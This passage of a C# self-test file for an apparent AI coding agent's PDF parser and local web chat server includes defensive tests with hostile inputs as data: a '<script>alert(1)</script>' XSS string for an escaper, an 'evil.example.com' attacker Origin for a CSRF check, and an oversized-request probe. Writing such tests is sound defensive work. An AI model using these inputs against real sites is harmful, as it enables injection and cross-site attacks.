        Check("Pdf: 最小 PDF 解析成功", parser != null);
        if (parser != null)
        {
            Check("Pdf: 页数正确", parser.NumberOfPages == 1);
            Check("Pdf: 标题解析", parser.Title == "Test Document");

            var text = parser.ExtractPageText(1);
            Check("Pdf: 提取 Hello World", text.Contains("Hello World"));
            Check("Pdf: 提取第二行", text.Contains("Second line"));
            Check("Pdf: 换行分隔", text.Contains("\n"));
        }

        // ── 2. 错误分支 ──
        Check("Pdf: 非 PDF 返回 null", PdfParser.Open(new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 }) == null);
        Check("Pdf: 空数据返回 null", PdfParser.Open(Array.Empty<byte>()) == null);

        // ── 3. PdfExtractor 公共 API 不变 ──
        var tmpPdf = Path.Combine(Path.GetTempPath(), "wc_pdf_" + Guid.NewGuid().ToString("N")[..6] + ".pdf");
        try
        {
            File.WriteAllBytes(tmpPdf, pdfBytes);
            var result = PdfExtractor.Extract(tmpPdf);
            Check("PdfExtractor: 非错误", !result.IsError);
            Check("PdfExtractor: 总页数", result.TotalPages == 1);
            Check("PdfExtractor: 页数已提取", result.PagesExtracted == 1);
            Check("PdfExtractor: 有字符", result.TotalChars > 0);
            Check("PdfExtractor: 标题", result.Title == "Test Document");
            var md = result.ToMarkdown();
            Check("PdfExtractor: ToMarkdown 含标签", md.Contains("<pdf>") && md.Contains("Hello World"));

            var meta = PdfExtractor.GetMeta(tmpPdf);
            Check("PdfExtractor: GetMeta 页数", meta?.Pages == 1);
            Check("PdfExtractor: GetMeta 标题", meta?.Title == "Test Document");

            Check("PdfExtractor: 不存在文件报错", PdfExtractor.Extract("/nonexistent.pdf").IsError);
            Check("PdfExtractor: 不存在文件 GetMeta null", PdfExtractor.GetMeta("/nonexistent.pdf") == null);
        }
        finally { try { File.Delete(tmpPdf); } catch { } }

        // ── 4. 损坏 PDF 优雅失败 ──
        var corrupt = Path.Combine(Path.GetTempPath(), "wc_corrupt_" + Guid.NewGuid().ToString("N")[..6] + ".pdf");
        try
        {
            File.WriteAllText(corrupt, "%PDF-1.4\nthis is not a valid pdf");
            Check("Pdf: 损坏 PDF 报错", PdfExtractor.Extract(corrupt).IsError);
        }
        finally { try { File.Delete(corrupt); } catch { } }
    }

    /// <summary>构造一个最小可解析 PDF（1 页、Type1 Helvetica、两个文本行 + 标题）。</summary>
    private static byte[] BuildMinimalPdf()
    {
        var bytes = new List<byte>();
        void Add(string s) => bytes.AddRange(Encoding.ASCII.GetBytes(s));

        Add("%PDF-1.4\n");

        var offsets = new long[7];
        offsets[1] = bytes.Count;
        Add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");

        offsets[2] = bytes.Count;
        Add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");

        offsets[3] = bytes.Count;
        Add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n");

        offsets[4] = bytes.Count;
        Add("4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n");

        var content = "BT /F1 12 Tf 72 720 Td (Hello World) Tj 0 -14 Td (Second line) Tj ET";
        offsets[5] = bytes.Count;
        Add($"5 0 obj\n<< /Length {content.Length} >>\nstream\n{content}\nendstream\nendobj\n");

        offsets[6] = bytes.Count;
        Add("6 0 obj\n<< /Title (Test Document) >>\nendobj\n");

        var xrefPos = bytes.Count;
        Add("xref\n0 7\n");
        Add("0000000000 65535 f \n");
        for (int i = 1; i <= 6; i++)
            Add($"{offsets[i]:D10} 00000 n \n");
        Add($"trailer\n<< /Size 7 /Root 1 0 R /Info 6 0 R >>\nstartxref\n{xrefPos}\n%%EOF\n");

        return bytes.ToArray();
    }

    /// <summary>浏览器聊天（--web）测试：HTTP 解析纯函数 + SSE 格式化 + 端到端冒烟</summary>
    private static void TestWeb(Action<string, bool> Check)
    {
        // ── 1. ParseHttpRequest 纯函数 ──
        var get = WayCoder.UI.Web.HttpServer.ParseHttpRequest("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
        Check("Web: GET 方法", get?.Method == "GET");
        Check("Web: GET 路径", get?.Path == "/");
        Check("Web: 头解析", get?.Header("Host") == "localhost");

        var post = WayCoder.UI.Web.HttpServer.ParseHttpRequest("POST /chat HTTP/1.1\r\nContent-Length: 5\r\n\r\nhello");
        Check("Web: POST 方法", post?.Method == "POST");
        Check("Web: POST 正文", post?.Body == "hello");

        var query = WayCoder.UI.Web.HttpServer.ParseHttpRequest("GET /x?a=1&b=2 HTTP/1.1\r\n\r\n");
        Check("Web: 查询串", query?.Path == "/x" && query?.Query == "a=1&b=2");

        Check("Web: 畸形请求 null", WayCoder.UI.Web.HttpServer.ParseHttpRequest("") == null);
        Check("Web: 畸形请求行 null", WayCoder.UI.Web.HttpServer.ParseHttpRequest("GARBAGE\r\n\r\n") == null);

        // ── 2. SseEvent 格式化 ──
        var sse = WayCoder.UI.Web.HttpServer.SseEvent("token", "\"hi\"");
        Check("Web: SSE event 前缀", sse.StartsWith("event: token\ndata: "));
        Check("Web: SSE 空行结尾", sse.EndsWith("\n\n"));

        // ── 3. FindHeaderEnd / ParseContentLength ──
        var hb = Encoding.UTF8.GetBytes("GET / HTTP/1.1\r\nContent-Length: 5\r\n\r\nbody");
        Check("Web: FindHeaderEnd 定位", WayCoder.UI.Web.HttpServer.FindHeaderEnd(hb) > 0);
        Check("Web: ParseContentLength", WayCoder.UI.Web.HttpServer.ParseContentLength("Content-Length: 123\r\nX: y") == 123);
        Check("Web: ParseContentLength 缺省 0", WayCoder.UI.Web.HttpServer.ParseContentLength("X: y") == 0);

        // ── 4. 前端 HTML 含关键元素 ──
        var html = WayCoder.UI.Web.WebAssets.Html;
        Check("Web: HTML 含 EventSource", html.Contains("EventSource('/events?client=' + clientId)"));
        Check("Web: HTML 含 /chat", html.Contains("/chat"));
        Check("Web: HTML 含 /interrupt", html.Contains("/interrupt"));
        Check("Web: HTML 含 Markdown 渲染器", html.Contains("function mdToHtml"));
        Check("Web: HTML 含 finalizeAssistant", html.Contains("function finalizeAssistant"));
        Check("Web: HTML 含流式态样式", html.Contains(".msg.assistant.streaming"));
        Check("Web: HTML 含权限模式下拉", html.Contains("id=\"perm-select\""));
        Check("Web: HTML 含权限模式切换", html.Contains("/perm"));

        // ── 5. 端到端冒烟：HTTP 服务 GET / ──
        var server = new WayCoder.UI.Web.HttpServer(0);
        server.OnRequest = req => req.Path == "/" ? WayCoder.UI.Web.HttpResponse.Html("<html>ok</html>") : null;
        server.Start();
        try
        {
            using var client = new HttpClient();
            var resp = client.GetStringAsync($"http://127.0.0.1:{server.ActualPort}/").Result;
            Check("Web: 端到端 GET / 返回 HTML", resp.Contains("ok"));
        }
        catch { Check("Web: 端到端 GET / 返回 HTML", false); }
        finally { server.Stop(); }
    }

    /// <summary>Web 界面完整化：换模型/换 key/设置/槽位切换/序列化纯函数 + 端点冒烟。</summary>
    private static void TestWebFull(Action<string, bool> Check)
    {
        // ── 1. LLM.Reconfigure（运行时换 key/baseUrl）──
        var llm = new LLM("deepseek-v4-flash", "old-key", "https://old.example.com");
        Check("WebFull: Reconfigure 前 key", llm.ApiKey == "old-key");
        llm.Reconfigure("new-key", "https://new.example.com");
        Check("WebFull: Reconfigure 换 key", llm.ApiKey == "new-key");
        Check("WebFull: Reconfigure 换 baseUrl", llm.BaseUrl == "https://new.example.com");
        Check("WebFull: Endpoint 随 baseUrl 更新", llm.Endpoint == "https://new.example.com/v1/chat/completions");
        llm.Model = "deepseek-v4-pro";
        Check("WebFull: Model 直接改生效", llm.Model == "deepseek-v4-pro" && llm.EffectiveModel == "deepseek-v4-pro");

        // ── 2. SerializeModels ──
        var modelsJson = WayCoder.UI.Web.WebChatServer.SerializeModels();
        var models = Json.Parse(modelsJson);
        Check("WebFull: models 是数组", models != null && models.Kind == JKind.Array);
        Check("WebFull: models 含 deepseek-v4-pro", modelsJson.Contains("deepseek-v4-pro"));
        Check("WebFull: models 含 gpt-5.5", modelsJson.Contains("gpt-5.5"));
        Check("WebFull: models 元素含 providerId", models![0]?["providerId"]?.AsString() != null);
        Check("WebFull: models 元素含 hasKey", models[0]?.Get("hasKey") != null);

        // ── 3. SerializeSettings ──
        var settingsJson = WayCoder.UI.Web.WebChatServer.SerializeSettings();
        var settings = Json.Parse(settingsJson);
        Check("WebFull: settings 是分组数组", settings != null && settings.Kind == JKind.Array);
        bool hasSecret = false, hasModel = false;
        foreach (var g in settings!.Items)
        {
            var items = g["items"];
            if (items == null) continue;
            foreach (var it in items.Items)
            {
                if (it["type"]?.AsString() == "secret") hasSecret = true;
                if (it["key"]?.AsString() == "Model") hasModel = true;
            }
        }
        Check("WebFull: settings 含 secret 字段", hasSecret);
        Check("WebFull: settings 含 Model 字段", hasModel);

        // ── 4. SerializeState / SerializeHistory ──
        var a0 = new Agent(new LLM("test", "sk-test"));
        var slots = new Agent?[10];
        slots[0] = a0;
        var stateJson = WayCoder.UI.Web.WebChatServer.SerializeState(0, slots);
        Check("WebFull: state 含 activeSlot=0", stateJson.Contains("\"activeSlot\":0"));
        Check("WebFull: state 含 slots", stateJson.Contains("\"slots\":"));
        Check("WebFull: state 含 permMode", stateJson.Contains("\"permMode\":"));
        Check("WebFull: history 空数组", WayCoder.UI.Web.WebChatServer.SerializeHistory(a0).Trim() == "[]");

        // ── 5. ApplyModel 非法模型（安全分支，不触发持久化）──
        Check("WebFull: ApplyModel 非法模型报错",
            WayCoder.UI.Web.WebChatServer.ApplyModel(a0, "no-such-model-xyz", null) != null);

        // ── 6. ProviderHasKey ──
        Check("WebFull: local 无需 key", WayCoder.UI.Web.WebChatServer.ProviderHasKey("local"));
        Check("WebFull: custom 无需 key", WayCoder.UI.Web.WebChatServer.ProviderHasKey("custom"));

        // ── 6b. IsTrustedOrigin（CSRF 防护）──
        Check("WebFull: 无 Origin（curl/SSE）放行", WayCoder.UI.Web.WebChatServer.IsTrustedOrigin(null, 8123));
        Check("WebFull: 本服务 Origin 放行", WayCoder.UI.Web.WebChatServer.IsTrustedOrigin("http://127.0.0.1:8123", 8123));
        Check("WebFull: localhost Origin 放行", WayCoder.UI.Web.WebChatServer.IsTrustedOrigin("http://localhost:8123", 8123));
        Check("WebFull: 攻击者 Origin 拒绝", !WayCoder.UI.Web.WebChatServer.IsTrustedOrigin("https://evil.example.com", 8123));
        Check("WebFull: Origin null 拒绝", !WayCoder.UI.Web.WebChatServer.IsTrustedOrigin("null", 8123));
        Check("WebFull: 端口不匹配拒绝", !WayCoder.UI.Web.WebChatServer.IsTrustedOrigin("http://127.0.0.1:9999", 8123));

        // ── 6c. HasKeyFor / SerializeScan / TestList（模型 key 检测 + 连通性扫描）──
        Check("HasKeyFor: local 无需 key", WayCoder.ApiKeyStore.HasKeyFor("local", "qwen2.5-coder:latest"));
        Check("HasKeyFor: custom 无需 key", WayCoder.ApiKeyStore.HasKeyFor("custom", "my-custom-model"));
        Check("HasKeyFor: 无 key 供应商返回 false", !WayCoder.ApiKeyStore.HasKeyFor("openai", "gpt-5.5"));
        ApiKeyStore.Set("__selftest_probe__", "sk-probe-123");
        Check("HasKeyFor: 已存 key 返回 true", WayCoder.ApiKeyStore.HasKeyFor("__selftest_probe__", "any-model"));
        ApiKeyStore.Remove("__selftest_probe__");
        Check("HasKeyFor: 删除后返回 false", !WayCoder.ApiKeyStore.HasKeyFor("__selftest_probe__", "any-model"));

        Check("ProviderFromEnvVarName: ANTHROPIC_API_KEY → anthropic",
            ApiKeyStore.ProviderFromEnvVarName("ANTHROPIC_API_KEY") == "anthropic");
        Check("ProviderFromEnvVarName: DEEPSEEK_API_KEY → deepseek",
            ApiKeyStore.ProviderFromEnvVarName("DEEPSEEK_API_KEY") == "deepseek");
        Check("ProviderFromEnvVarName: 无关变量返回 null",
            ApiKeyStore.ProviderFromEnvVarName("FOO_BAR") == null);

        var probes = new List<WayCoder.ModelCli.EndpointProbe>
        {
            new("openai", "OpenAI", "https://api.openai.com", true, "已连接（200）", new[] { "gpt-5.5", "gpt-5.5-mini" }),
            new("bad", "Bad", "https://bad.example.com", false, "无法连接", Array.Empty<string>()),
        };
        var scanJson = WayCoder.UI.Web.WebChatServer.SerializeScan(probes);
        var scanArr = Json.Parse(scanJson);
        Check("SerializeScan: 是数组", scanArr?.Kind == JKind.Array);
        Check("SerializeScan: 含 providerId/ok/detail",
            scanJson.Contains("\"providerId\"") && scanJson.Contains("\"ok\"") && scanJson.Contains("\"detail\""));
        Check("SerializeScan: ok 字段正确",
            scanArr![0]?["ok"]?.AsBool() == true && scanArr[1]?["ok"]?.AsBool() == false);

        var testList = WayCoder.ModelCli.TestList();
        Check("TestList: 返回列表（不抛异常）", testList != null);

        // ── 7. 端点冒烟：WebChatServer + HttpClient ──
        var web = new WayCoder.UI.Web.WebChatServer(a0, 0);
        web.Start();
        try
        {
            using var client = new HttpClient();
            var baseUrl = $"http://127.0.0.1:{web.Port}";

            var m = client.GetStringAsync(baseUrl + "/models").Result;
            Check("WebFull: GET /models 数组", Json.Parse(m)?.Kind == JKind.Array);

            var s = client.GetStringAsync(baseUrl + "/state").Result;
            Check("WebFull: GET /state 含 activeSlot", s.Contains("\"activeSlot\":"));

            var st = client.GetStringAsync(baseUrl + "/settings").Result;
            Check("WebFull: GET /settings 数组", Json.Parse(st)?.Kind == JKind.Array);

            var slotResp = client.PostAsync(baseUrl + "/slot",
                new StringContent("{\"slot\":3}", Encoding.UTF8, "application/json")).Result;
            var slotBody = slotResp.Content.ReadAsStringAsync().Result;
            Check("WebFull: POST /slot 返回历史数组", Json.Parse(slotBody)?.Kind == JKind.Array);

            // 双客户端绑不同槽位（页面作用域隔离核心：各页开始/停止只作用自己的槽位）
            var stA = client.GetStringAsync(baseUrl + "/state?client=aaa").Result;
            var stB = client.GetStringAsync(baseUrl + "/state?client=bbb").Result;
            int slotA = (int)Math.Round(Json.Parse(stA)?["activeSlot"]?.AsNumber() ?? -1);
            int slotB = (int)Math.Round(Json.Parse(stB)?["activeSlot"]?.AsNumber() ?? -1);
            Check("WebFull: 两个客户端分配不同槽位", slotA >= 0 && slotB >= 0 && slotA != slotB);

            client.PostAsync(baseUrl + "/slot?client=aaa",
                new StringContent("{\"slot\":3}", Encoding.UTF8, "application/json")).Wait();
            var stA2 = client.GetStringAsync(baseUrl + "/state?client=aaa").Result;
            var stB2 = client.GetStringAsync(baseUrl + "/state?client=bbb").Result;
            int slotA2 = (int)Math.Round(Json.Parse(stA2)?["activeSlot"]?.AsNumber() ?? -1);
            int slotB2 = (int)Math.Round(Json.Parse(stB2)?["activeSlot"]?.AsNumber() ?? -1);
            Check("WebFull: clientA 切到槽 3", slotA2 == 3);
            Check("WebFull: clientB 不受 clientA 切槽影响", slotB2 == slotB);

            var badModel = client.PostAsync(baseUrl + "/model",
                new StringContent("{\"modelId\":\"no-such\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebFull: POST /model 非法模型报错", badModel.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));

            var badSetting = client.PostAsync(baseUrl + "/settings",
                new StringContent("{\"key\":\"Nope\",\"value\":\"x\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebFull: POST /settings 未知项报错", badSetting.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));

            var scan = client.PostAsync(baseUrl + "/models/scan",
                new StringContent("{}", Encoding.UTF8, "application/json")).Result;
            var scanBody = scan.Content.ReadAsStringAsync().Result;
            Check("WebFull: POST /models/scan 返回 ok+results", scanBody.Contains("\"ok\":true") && scanBody.Contains("\"results\":"));
        }
        catch { Check("WebFull: 端点冒烟", false); }
        finally { web.Stop(); }
    }

    /// <summary>P4-2 Web 资源耗尽防护 + XSS：请求正文大小上限/连接上限/SSE+输入队列上限/HtmlEscape。</summary>
    private static void TestP4WebResource(Action<string, bool> Check)
    {
        // ── 1. 请求正文大小上限（纯逻辑）──
        Check("WebRes: 上限内不拒绝", !WayCoder.UI.Web.HttpServer.IsRequestTooLarge(WayCoder.UI.Web.HttpServer.MaxRequestBytes));
        Check("WebRes: 超上限拒绝", WayCoder.UI.Web.HttpServer.IsRequestTooLarge(WayCoder.UI.Web.HttpServer.MaxRequestBytes + 1));

        // ── 2. 超大 Content-Length → 413（端到端，服务端读完头立即拒绝不等待正文）──
        var bigServer = new WayCoder.UI.Web.HttpServer(0);
        bigServer.OnRequest = req => req.Path == "/chat" ? WayCoder.UI.Web.HttpResponse.Text("ok") : null;
        bigServer.Start();
        try
        {
            using var tcp = new System.Net.Sockets.TcpClient();
            tcp.Connect("127.0.0.1", bigServer.ActualPort);
            var raw = "POST /chat HTTP/1.1\r\nHost: localhost\r\nContent-Length: 999999999\r\n\r\n";
            tcp.GetStream().Write(Encoding.UTF8.GetBytes(raw));
            var buf = new byte[4096];
            int rn = tcp.GetStream().Read(buf, 0, buf.Length);
            var resp = Encoding.UTF8.GetString(buf, 0, rn);
            Check("WebRes: 超大 Content-Length 返回 413", resp.StartsWith("HTTP/1.1 413"));
        }
        catch { Check("WebRes: 超大 Content-Length 返回 413", false); }
        finally { bigServer.Stop(); }

        // ── 3. 连接槽位上限（SemaphoreSlim 机制）──
        var capServer = new WayCoder.UI.Web.HttpServer(0);
        int got = 0;
        for (int i = 0; i < WayCoder.UI.Web.HttpServer.MaxConnections; i++)
            if (capServer.TryAcquireConnectionSlot()) got++;
        Check("WebRes: 连接槽位全部可获取", got == WayCoder.UI.Web.HttpServer.MaxConnections);
        Check("WebRes: 连接槽位满后拒绝", !capServer.TryAcquireConnectionSlot());
        capServer.ReleaseConnectionSlot();
        Check("WebRes: 释放后可再获取", capServer.TryAcquireConnectionSlot());
        // 清理占用的槽位（不留满槽位状态）
        for (int i = 0; i < WayCoder.UI.Web.HttpServer.MaxConnections; i++) capServer.ReleaseConnectionSlot();

        // ── 4. SSE 客户端 / 输入队列上限（纯逻辑）──
        Check("WebRes: SSE 未满", !WayCoder.UI.Web.WebChatServer.SseClientsFull(WayCoder.UI.Web.WebChatServer.MaxSseClients - 1));
        Check("WebRes: SSE 满", WayCoder.UI.Web.WebChatServer.SseClientsFull(WayCoder.UI.Web.WebChatServer.MaxSseClients));
        Check("WebRes: 输入队列未满", !WayCoder.UI.Web.WebChatServer.InputQueueFull(WayCoder.UI.Web.WebChatServer.MaxPendingInput - 1));
        Check("WebRes: 输入队列满", WayCoder.UI.Web.WebChatServer.InputQueueFull(WayCoder.UI.Web.WebChatServer.MaxPendingInput));

        // ── 4b. 客户端身份解析 + 槽位分配（页面作用域隔离）──
        Check("WebSlot: client 从 query 取出", WayCoder.UI.Web.WebChatServer.ParseClientQuery("client=abc123") == "abc123");
        Check("WebSlot: client 多参数排序无关", WayCoder.UI.Web.WebChatServer.ParseClientQuery("a=1&client=xyz&b=2") == "xyz");
        Check("WebSlot: client 大小写不敏感", WayCoder.UI.Web.WebChatServer.ParseClientQuery("CLIENT=Abc") == "Abc");
        Check("WebSlot: client 含 URL 编码", WayCoder.UI.Web.WebChatServer.ParseClientQuery("client=c%201%2B2") == "c 1+2");
        Check("WebSlot: 无 client 返回 null", WayCoder.UI.Web.WebChatServer.ParseClientQuery("a=1&b=2") == null);
        Check("WebSlot: 空 query 返回 null", WayCoder.UI.Web.WebChatServer.ParseClientQuery("") == null);
        Check("WebSlot: null query 返回 null", WayCoder.UI.Web.WebChatServer.ParseClientQuery(null) == null);
        Check("WebSlot: client 无值返回空串", WayCoder.UI.Web.WebChatServer.ParseClientQuery("client=") == "");
        Check("WebSlot: 空闲槽位取首个", WayCoder.UI.Web.WebChatServer.PickFreeSlot(new[] { true, false, false, false }, 4) == 1);
        Check("WebSlot: 全空取 0", WayCoder.UI.Web.WebChatServer.PickFreeSlot(new[] { false, false, false }, 3) == 0);
        Check("WebSlot: 全满回退 0", WayCoder.UI.Web.WebChatServer.PickFreeSlot(new[] { true, true, true }, 3) == 0);
        Check("WebSlot: 前段占用跳过", WayCoder.UI.Web.WebChatServer.PickFreeSlot(new[] { true, true, false, true }, 4) == 2);

        // ── 5. XSS 转义（工具名/参数注入 innerHTML 前转义）──
        Check("WebRes: HtmlEscape 脚本标签", WayCoder.UI.Web.WebChatServer.HtmlEscape("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;");
        Check("WebRes: HtmlEscape 引号", WayCoder.UI.Web.WebChatServer.HtmlEscape("\"'") == "&quot;&#39;");
        Check("WebRes: HtmlEscape 与号优先", WayCoder.UI.Web.WebChatServer.HtmlEscape("&") == "&amp;");
        Check("WebRes: HtmlEscape 空串透传", WayCoder.UI.Web.WebChatServer.HtmlEscape("") == "");
        Check("WebRes: HtmlEscape 正常文本不变", WayCoder.UI.Web.WebChatServer.HtmlEscape("echo hello") == "echo hello");
    }

    /// <summary>Web 交互桥 mock 实现（测试 AskUserQuestionTool 走桥而非 Console）。</summary>
    private sealed class MockInteraction : UxHelper.IWebInteraction
    {
        public string? SelectResult;
        public bool SelectCalled;
        public DiffConfirmResult? DiffResult;
        public bool DiffCalled;

        public Task<string?> AskAsync(string prompt, string? defaultValue, int timeoutMs) => Task.FromResult((string?)null);
        public Task<string?> SelectAsync(string title, List<string> choices, int timeoutMs) { SelectCalled = true; return Task.FromResult(SelectResult); }
        public Task<List<string>?> MultiSelectAsync(string title, List<string> choices, int timeoutMs) => Task.FromResult((List<string>?)null);
        public Task<int> ConfirmAsync(string title, string message, bool allowAll, int timeoutMs) => Task.FromResult(2);
        public Task<DiffConfirmResult?> DiffConfirmAsync(string filePath, List<DiffPreview.Hunk> hunks, int timeoutMs)
        { DiffCalled = true; return Task.FromResult(DiffResult); }
    }

    /// <summary>Web 三栏面板：SerializePanel/SerializeSessions/LspTool.ActiveSessions/交互桥/端点冒烟。</summary>
    private static void TestWebPanelSessions(Action<string, bool> Check)
    {
        // ── 1. SerializePanel（右栏六类数据）──
        var a = new Agent(new LLM("test", "sk-test"));
        var slots = new Agent?[10];
        slots[0] = a;
        var panel = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializePanel(0, slots));
        Check("WebPanel: 含 todos", panel?["todos"] != null);
        Check("WebPanel: 含 tokens", panel?["tokens"] != null);
        Check("WebPanel: 含 cost", panel?["cost"] != null);
        Check("WebPanel: 含 files", panel?["files"] != null);
        Check("WebPanel: 含 mcp", panel?["mcp"] != null);
        Check("WebPanel: 含 lsp", panel?["lsp"] != null);
        Check("WebPanel: 活跃槽位 token 字段", panel?["tokens"]?["totalPrompt"] != null);
        var emptyPanel = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializePanel(0, new Agent?[10]));
        Check("WebPanel: 全空槽位不抛异常", emptyPanel != null && emptyPanel["tokens"] != null);
        var oobPanel = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializePanel(99, slots));
        Check("WebPanel: 越界槽位不抛异常", oobPanel != null);

        // ── 2. SerializeSessions（历史会话列表）──
        var savedId = SessionManager.SaveSession(
            new List<JNode> { JNode.Object().Set("role", "user").Set("content", "测试会话预览") },
            "test-model");
        try
        {
            var sj = WayCoder.UI.Web.WebChatServer.SerializeSessions();
            Check("WebPanel: sessions 含刚保存会话", sj.Contains(savedId));
            var parsed = Json.Parse(sj);
            bool previewOk = false;
            foreach (var it in parsed!.Items)
            {
                if (it["id"]?.AsString() == savedId)
                {
                    previewOk = it["preview"]?.AsString() == "测试会话预览";
                    break;
                }
            }
            Check("WebPanel: sessions preview 正确", previewOk);
        }
        finally { SessionManager.DeleteSession(savedId); }

        // ── 3. LspTool.ActiveSessions 访问器（空态不抛异常）──
        var lspSessions = LspTool.ActiveSessions;
        Check("WebPanel: LspTool.ActiveSessions 返回列表", lspSessions != null);
        Check("WebPanel: 空 LSP 会话不抛异常", lspSessions!.Count >= 0);

        // ── 4. 交互桥：AskUserQuestionTool 走 WebInteraction 而非 Console ──
        var mock = new MockInteraction { SelectResult = "A  —  desc A" };
        UxHelper.WebInteraction = mock;
        try
        {
            var tool = new AskUserQuestionTool();
            var q = JNode.Object().Set("question", "选哪个").Set("header", "choice")
                .Set("options", JNode.Array().Add(JNode.Object().Set("label", "A").Set("description", "desc A")));
            var args = new Dictionary<string, object?> { ["questions"] = JNode.Array().Add(q) };
            var result = tool.ExecuteAsync(args).Result;
            Check("WebAsk: AskUserQuestionTool 走桥", mock.SelectCalled);
            var resNode = Json.Parse(result);
            Check("WebAsk: 单选 label 解析正确", resNode?["choice"]?.AsString() == "A");
        }
        finally { UxHelper.WebInteraction = null; }

        // ── 5. 端点冒烟：/panel /sessions /sessions/load /answer ──
        var web = new WayCoder.UI.Web.WebChatServer(a, 0);
        web.Start();
        try
        {
            using var client = new HttpClient();
            var baseUrl = $"http://127.0.0.1:{web.Port}";

            var p = Json.Parse(client.GetStringAsync(baseUrl + "/panel").Result);
            Check("WebPanel: GET /panel 六字段", p?["todos"] != null && p?["lsp"] != null);

            var ss = Json.Parse(client.GetStringAsync(baseUrl + "/sessions").Result);
            Check("WebPanel: GET /sessions 数组", ss?.Kind == JKind.Array);

            var loadResp = client.PostAsync(baseUrl + "/sessions/load",
                new StringContent("{\"id\":\"no-such-session-xyz\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebPanel: POST /sessions/load 非法 id 报错",
                loadResp.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));

            var ansResp = client.PostAsync(baseUrl + "/answer",
                new StringContent("{\"requestId\":\"999999\",\"value\":\"x\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebPanel: POST /answer 无匹配报错",
                ansResp.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));

            // /perm 权限模式切换：设置后 state 反映，且恢复 ask 避免污染其它测试
            var permResp = client.PostAsync(baseUrl + "/perm",
                new StringContent("{\"mode\":\"yolo\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebPanel: POST /perm 成功", permResp.Content.ReadAsStringAsync().Result.Contains("\"ok\":true"));
            var stAfterPerm = client.GetStringAsync(baseUrl + "/state").Result;
            Check("WebPanel: /perm 后 state 反映 yolo", stAfterPerm.Contains("\"permMode\":\"yolo\""));
            var permBad = client.PostAsync(baseUrl + "/perm",
                new StringContent("{}", Encoding.UTF8, "application/json")).Result;
            Check("WebPanel: POST /perm 缺 mode 报错", permBad.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));
            client.PostAsync(baseUrl + "/perm",
                new StringContent("{\"mode\":\"ask\"}", Encoding.UTF8, "application/json")).Wait();
        }
        catch { Check("WebPanel: 端点冒烟", false); }
        finally { web.Stop(); }
    }

    /// <summary>Web 斜杠命令：HandleCommand 纯函数 + /command 端点冒烟 + HTML 结构。</summary>
    private static void TestWebCommands(Action<string, bool> Check)
    {
        var a = new Agent(new LLM("test", "sk-test"));

        // ── 1. HandleCommand 纯函数 ──
        var (hHelp, oHelp) = WayCoder.UI.Web.WebChatServer.HandleCommand("/help", a);
        Check("WebCmd: /help 处理", hHelp && oHelp.Contains("Web 命令"));

        var (hPerm, oPerm) = WayCoder.UI.Web.WebChatServer.HandleCommand("/perm", a);
        Check("WebCmd: /perm 无参显示当前", hPerm && oPerm.Contains("权限模式"));

        var (hPermSet, oPermSet) = WayCoder.UI.Web.WebChatServer.HandleCommand("/perm yolo", a);
        Check("WebCmd: /perm yolo 切换", hPermSet && oPermSet.Contains("已切换"));
        WayCoder.UI.Web.WebChatServer.HandleCommand("/perm ask", a); // 恢复默认

        var (hModelList, oModelList) = WayCoder.UI.Web.WebChatServer.HandleCommand("/model list", a);
        Check("WebCmd: /model list 列模型", hModelList && oModelList.Contains("模型列表"));

        var (hModel, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/model", a);
        Check("WebCmd: /model 无参不处理（前端弹窗）", !hModel);

        var (hReset, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/reset", a);
        Check("WebCmd: /reset 处理", hReset);

        var (hTokens, oTokens) = WayCoder.UI.Web.WebChatServer.HandleCommand("/tokens", a);
        Check("WebCmd: /tokens 统计", hTokens && oTokens.Contains("Token"));

        var (hMcp, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/mcp", a);
        Check("WebCmd: /mcp 状态", hMcp);

        var (hTodo, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/todo", a);
        Check("WebCmd: /todo 任务", hTodo);

        var (hUnknown, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/foobar-xyz", a);
        Check("WebCmd: 未知命令不处理", !hUnknown);

        var (hPlain, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("hello world", a);
        Check("WebCmd: 非斜杠不处理", !hPlain);

        var (hNull, oNull) = WayCoder.UI.Web.WebChatServer.HandleCommand("/tokens", null);
        Check("WebCmd: 空槽位 /tokens 提示", hNull && oNull.Contains("无活跃槽位"));

        // ── 2. /command 端点冒烟 ──
        var web = new WayCoder.UI.Web.WebChatServer(a, 0);
        web.Start();
        try
        {
            using var client = new HttpClient();
            var baseUrl = $"http://127.0.0.1:{web.Port}";

            var helpResp = client.PostAsync(baseUrl + "/command",
                new StringContent("{\"input\":\"/help\"}", Encoding.UTF8, "application/json")).Result;
            var helpBody = helpResp.Content.ReadAsStringAsync().Result;
            Check("WebCmd: POST /command /help 处理", helpBody.Contains("\"handled\":true") && helpBody.Contains("Web 命令"));

            var unknownResp = client.PostAsync(baseUrl + "/command",
                new StringContent("{\"input\":\"/nope-xyz\"}", Encoding.UTF8, "application/json")).Result;
            Check("WebCmd: POST /command 未知回退", unknownResp.Content.ReadAsStringAsync().Result.Contains("\"handled\":false"));

            var interruptResp = client.PostAsync(baseUrl + "/command",
                new StringContent("{\"input\":\"/interrupt\"}", Encoding.UTF8, "application/json")).Result;
